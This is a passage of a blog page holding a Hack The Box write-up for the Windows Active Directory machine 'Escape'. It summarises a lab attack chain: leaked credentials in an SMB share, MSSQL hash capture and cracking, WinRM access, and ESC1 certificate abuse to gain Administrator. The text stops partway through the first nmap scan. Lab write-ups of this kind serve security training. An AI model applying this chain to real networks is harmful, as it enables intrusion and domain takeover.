@@ -1,0 +1,1041 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">pL4StiC - HtB Escape</title>
+<meta property="og:title" content=pL4StiC&#32;-&#32;HtB&#32;Escape />
+<meta name="twitter:title" content=pL4StiC&#32;-&#32;HtB&#32;Escape />
+<meta itemprop="name" content=pL4StiC&#32;-&#32;HtB&#32;Escape />
+<meta name="application-name" content=pL4StiC&#32;-&#32;HtB&#32;Escape />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="https://pL4sTiC1337.github.io/writeups/htb-escape/" />
+<link rel="canonical" href="https://pL4sTiC1337.github.io/writeups/htb-escape/" itemprop="url" />
+<meta name="url" content="https://pL4sTiC1337.github.io/writeups/htb-escape/" />
+<meta name="twitter:url" content="https://pL4sTiC1337.github.io/writeups/htb-escape/" />
+<meta property="og:url" content="https://pL4sTiC1337.github.io/writeups/htb-escape/" />
+
+
+<meta property="og:updated_time" content="2025-02-13T11:21:41-05:00" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='https://pL4sTiC1337.github.io/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+  
+    <meta name="twitter:site" content="@pL4sTiC1337" />
+    <meta name="twitter:creator" content="@pL4sTiC1337" />
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.143.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.cca58c146f4edc10af613962d5043d66deb02f90a09c9f14c98adf9418774835.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="https://pL4sTiC1337.github.io/">
+                <img src="/images/pl4stic.png" alt="brand image">
+            </a>
+        
+        
+            <a href="https://pL4sTiC1337.github.io/">
+                <h1>pL4StiC</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    My Ramblings...
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/posts/dark-side-of-wifi/">The Dark Side of WiFi</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/posts/the-age-of-uts/">The Age of Ubiquitous Surveillance</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/posts/the-rfid-badge-capture/">The RFID Badge Capture</a>
+                            </li>
+                        
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-escape/">HtB Escape</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-giddy/">HtB Giddy</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-faculty/">HtB Faculty</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-jab/">HtB Jab</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-hospital/">HtB Hospital</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/pL4sTiC1337">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+
+
+    <a target="_blank" class="social" title="X" href="https://x.com/pL4sTiC1337">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
+            <path fill="currentColor" d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/r/p/pL4sTiC">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
+            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2025 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="https://pL4sTiC1337.github.io/writeups/htb-escape/">HtB Escape</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-02-13T11:21:41-0500" class="post-date">
+        February 13, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>12 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-writeup">
+        <a href="https://pL4sTiC1337.github.io/tags/writeup">writeup</a>
+      </li>
+      
+      <li class="tag-hackthebox">
+        <a href="https://pL4sTiC1337.github.io/tags/hackthebox">hackthebox</a>
+      </li>
+      
+      <li class="tag-medium">
+        <a href="https://pL4sTiC1337.github.io/tags/medium">medium</a>
+      </li>
+      
+      <li class="tag-windows">
+        <a href="https://pL4sTiC1337.github.io/tags/windows">windows</a>
+      </li>
+      
+      <li class="tag-active directory">
+        <a href="https://pL4sTiC1337.github.io/tags/active-directory">active directory</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p><img src="/images/Escape.png" alt="HtB-Escape"></p>
+<p>Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user <code>ryan.cooper</code>. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.</p>
+<hr>
+<h2 id="scanning">Scanning</h2>
+<h3 id="nmap">nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -T4 -p- -A -v 10.129.228.253             
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-12 14:09 EST
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-02-13 03:11:50Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: 
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>sequel-DC-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-01-18T23:03:57
+</span></span><span style="display:flex;"><span>| Not valid after:  2074-01-05T23:03:57
+</span></span><span style="display:flex;"><span>| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
+</span></span><span style="display:flex;"><span>|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-13T03:13:23+00:00; +8h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
